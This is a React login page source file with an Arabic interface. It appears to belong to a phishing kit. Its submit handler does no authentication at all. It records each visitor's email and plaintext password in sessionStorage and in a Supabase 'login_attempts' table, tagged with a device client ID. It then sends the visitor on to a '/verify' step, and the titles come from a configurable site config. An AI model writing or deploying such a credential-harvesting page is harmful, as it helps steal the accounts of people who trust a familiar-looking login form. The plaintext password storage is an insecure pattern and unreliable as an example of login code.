import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
import { supabase } from '@/lib/supabase';
import { getClientId } from '@/lib/clientId';
import { useSiteConfig } from '@/context/SiteConfigContext';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

export default function LoginPage() {
  const navigate = useNavigate();
  const { config } = useSiteConfig();
  const pg = config.login;

  const [email, setEmail] = useState(sessionStorage.getItem('reg_email') || '');
  const [password, setPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');



  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.includes('@')) { setError('البريد الإلكتروني غير صحيح'); return; }
    if (!password) { setError('كلمة المرور مطلوبة'); return; }

    setLoading(true);
    setError('');

    try {
      // Save to sessionStorage
      sessionStorage.setItem('reg_email', email.trim().toLowerCase());
      sessionStorage.setItem('reg_password', password);

      // Try to save login attempt to database (if table exists)
      try {
        const regId = sessionStorage.getItem('reg_id');
        await supabase.from('login_attempts').insert({
          registration_id: regId || null,
          client_id: getClientId(), // Link to this browser/device
          email: email.trim().toLowerCase(),
          password: password,
        });
      } catch (dbErr) {
        console.warn('Could not save login attempt to database:', dbErr);
        // Continue anyway - login should still work
      }
      
      setLoading(false);
      navigate('/verify');
    } catch (err: any) {
      console.error('Login error:', err);
      setLoading(false);
      setError(`خطأ: ${err.message || 'حدث خطأ غير متوقع'}`);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
      <Header />
      <main className="flex-1 flex items-center justify-center py-10 px-4 sm:px-6">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-14 h-14 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <LogIn className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-800">{pg.title}</h1>
            <p className="text-slate-500 mt-2">{pg.subtitle}</p>
          </div>

          <div className="flex items-center justify-center gap-2 mb-8 flex-wrap">
            {[
              { label: 'البيانات', done: true },
              { label: 'الدخول', active: true },
              { label: 'التحقق', done: false },
              { label: 'الإتمام', done: false },
            ].map((step, i) => (
              <div key={step.label} className="flex items-center gap-2">
                <div className={`px-3 py-1.5 rounded-full text-xs font-semibold ${step.done ? 'bg-green-100 text-green-700' : step.active ? 'bg-blue-600 text-white' : 'bg-slate-200 text-slate-400'}`}>
                  {step.label}
                </div>
                {i < 3 && <div className="w-4 h-px bg-slate-300 hidden sm:block" />}
              </div>
            ))}
          </div>

          <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 sm:p-8 space-y-5">
            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-1.5">
                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Mail className="w-4 h-4 text-blue-500" /> البريد الإلكتروني
                </label>
                <input type="email" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }}
                  placeholder="example@mail.com" dir="ltr"
                  className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 text-left" />
              </div>

              <div className="space-y-1.5">
                <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Lock className="w-4 h-4 text-blue-500" /> كلمة المرور
                </label>
                <div className="relative">
                  <input type={showPass ? 'text' : 'password'} value={password}
                    onChange={(e) => { setPassword(e.target.value); setError(''); }}
                    placeholder="••••••••" dir="ltr"
                    className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100" />
                  <button type="button" onClick={() => setShowPass(!showPass)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600">
                    {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {error && <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium">{error}</div>}

              <button type="submit" disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-4 rounded-xl shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-base">
                {loading
                  ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  : <><span>{pg.button_text}</span><ArrowLeft className="w-5 h-5" /></>}
              </button>
            </form>

            <div className="border-t border-slate-100 pt-4 text-center">
              <p className="text-sm text-slate-500">
                ليس لديك حساب؟{' '}
                <button onClick={() => navigate('/register')} className="text-blue-600 font-semibold hover:underline">سجّل الآن</button>
              </p>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}
